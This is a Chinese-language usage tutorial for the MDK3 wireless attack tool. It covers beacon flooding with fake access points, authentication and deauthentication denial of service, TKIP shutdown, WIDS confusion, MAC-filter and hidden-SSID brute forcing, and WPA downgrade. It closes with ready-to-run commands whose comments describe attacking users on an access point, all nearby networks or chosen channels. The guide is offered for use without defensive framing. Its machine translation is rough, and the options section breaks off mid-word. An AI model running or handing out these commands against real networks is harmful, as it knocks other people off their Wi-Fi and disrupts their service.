# MDK3使用教程

## 工具特点
- Bruteforce MAC过滤器
- 蛮力隐藏的SSID（包括一些小的SSID字词表）
- 探测网络来检查他们是否可以听到你的声音
- 智能身份验证 - 冻结AP的DoS（成功检查）
- FakeAP - 信标泛滥与渠道跳跃
- 使用解除认证和解除关联数据包断开所有事情
- WPA TKIP拒绝服务
- WDS混淆 - 关闭大规模多AP安装

## **工具用法**

```
mdk3 <interface> <test_mode> [test_options]
mdk3 <接口> <测试模式> [测试选项]
```

## **测试模式**
```
b - 信标泛滥模式

    发送信标帧以在客户端显示假AP。这有时会使网络扫描器甚至驱动程序崩溃！

a - 身份验证DoS模式

    将认证帧发送到在范围内找到的所有AP。太多的客户端冻结或重置一些AP。

p - 基本探测和ESSID Bruteforce模式

    探测AP并检查答案，用于检查SSID是否有用被正确decloaked或如果AP在您的适配器发送范围

    此测试模式下SSID Bruteforcing也是可能的。

d - 解除/分离Amok模式

    踢掉AP上发现的每个人

m - 迈克尔关机开发（TKIP）

    连续取消所有流量

x - 802.1X测试

W - WIDS / WIPS混乱

    混淆/滥用入侵检测和预防系统

f - MAC过滤器暴力模式

    此测试使用已知的客户端MAC地址列表，并尝试在动态变化的同时将它们认证给给定的AP

    其响应超时以获得最佳性能。目前只有作品对拒绝正确认证请求的AP进行处理

g - WPA降级测试

    取消验证发送WPA加密数据包的工作站和AP。

    有了这个测试，你可以检查系统管理员是否会尝试设置他的网络到WEP或禁用加密。
```


## **选项**：

```
-n 使用SSID 而不是随机生成的

-f  从文件读取SSID

-v  从文件读取MAC和SSID。请参阅/usr/share/doc/mdk3/fakeap-example.txt中的示例文件

-d  将工作站显示为Ad-Hoc

-w 设置WEP位（生成加密的网络）

-G 显示站为54 Mbit

-t  使用WPA TKIP加密显示站点

-a  一个使用WPA AES加密显示电台

-m 从OUI数据库使用有效的访问点MAC

-H 跳到AP被欺骗的频道，这使得测试对某些设备/驱动程序更有效，但是由于信道跳变，它降低了分组速率。

-c <chan>在频道上伪造一个AP。如果你想让你的卡跳上去，这个频道，你也必须设置-h选项！

-s <pps>  设置每秒数据包的速度（默认值：50）



a - 身份验证DoS模式

将认证帧发送到在范围内找到的所有AP。太多的客户端冻结或重置几乎每个AP。

选项：

-a <ap_mac>         只测试指定的AP

-m         从OUI数据库使用有效的客户端MAC

-C         不要检查测试是否成功

-i <ap_mac>         对AP进行智能测试（-a和-c将被忽略）， 这个测试将客户端连接到AP，并重新嗅探数据以保持活跃

-s <pps>         以每秒数据包速度设置（默认值：无限制）



p - 基本探测和ESSID Bruteforce模式

探测AP并检查答案，用于检查SSID是否有用，被正确decloaked或如果AP在您的适配器发送范围，使用-f和-t选项来启用SSID Bruteforcing。

选项：

 -e <ssid>         告诉mdk3探测哪个SSID

-f <filename>         从文件中读取行以强制隐藏的SSID

-t <bssid>         设置目标AP的MAC地址

-s <pps>         设置速度（默认：无限，在Bruteforce模式下：300）

-b <character set>         使用完整的Bruteforce模式（建议仅适用于简短的SSID！），使用此开关只显示其帮助屏幕。



d - 解除/分离Amok模式

踢从AP发现每个人

选项：

-w <filename>         读取包含MAC的文件不关心（白名单模式）

-b <filename>         读取包含MAC的文件以运行测试（黑名单模式）

-s <pps>         以每秒数据包速度设置（默认值：无限制）

-c [chan,chan,chan,...]         启用频道跳频。没有提供任何渠道，mdk3将跳过所有14个b / g频道。频道将每5秒更换一次。



m - 迈克尔关机开发（TKIP）

连续取消所有流量

-t <bssid>         设置目标AP的Mac地址

-w <秒>         突发之间的秒数（默认值：10）

-n <ppb>         每个突发设置数据包（默认值：70）

 -j         使用新的TKIP QoS-Exploit，只需要几个数据包来关闭AP！

-s <pps>         设置速度（默认：400）



x - 802.1X测试

0 - EAPOL启动数据包泛滥

-n <ssid>               使用SSID <ssid>

-t <bssid>               设置目标AP的MAC地址

-w <WPA类型>               设置WPA类型（1：WPA，2：WPA2 / RSN;默认：WPA）

-u <单播密码>               设置单播密码类型（1：TKIP，2：CCMP;默认值：TKIP）

-m <组播密码>               设置组播加密类型（1：TKIP，2：CCMP;默认：TKIP）

-s <pps>               设置速度（默认：400）

1 - EAPOL注销测试

-t <bssid>               设置目标AP的MAC地址

-c <bssid>               设置目标STA的MAC地址

-s <pps>               设置速度（默认：400）



w - WIDS / WIPS / WDS混乱

混淆一个WDS与多个认证的客户端混淆了路由表

-e <SSID>         目标WDS网络的SSID

-c [chan，chan，chan ...]         使用频道跳频

-z         激活Zero_Chaos的WIDS利用，（从WDS向外国接入点认证客户端，使WIDS发疯）



f - MAC过滤器暴力模式

此测试使用已知的客户端MAC地址列表，并尝试在动态变化的同时将它们认证给给定的AP，其响应超时以获得最佳性能。目前只有作品 对拒绝正确认证请求的AP进行处理

-t <bssid>         目标BSSID

-m <mac>         设置要使用的MAC地址范围（3个字节，即00:12:34）没有-m，内部数据库将被使用

-f <mac>         设置MAC地址开始bruteforce与（注意：不能同时使用-f和-m）



g - WPA降级测试

取消验证工作站和AP发送WPA e
```

## **使用案例**

网卡先开监听模式：
`airmon-ng start wlan1`

相关查看命令：

`ifconfig`
`iwconfig`

抓包监听：

`airodump-ng wlan1mon`
`aircreak-ng的那一系列工具`

```
sudo mdk3 wlan1mon a -a [ap_mac] -c    # 攻击某一AP上的用户
sudo mdk3 wlan1mon d -w whilelist.txt   # 攻击当前环境中的所有AP，可设置黑白名单
sudo mdk3 wlan1mon d -c 1,6,11     # 攻击指定的信道
sudo mdk3 wlan1mon b -f fakewifi -t   # 释放大量虚假AP
```
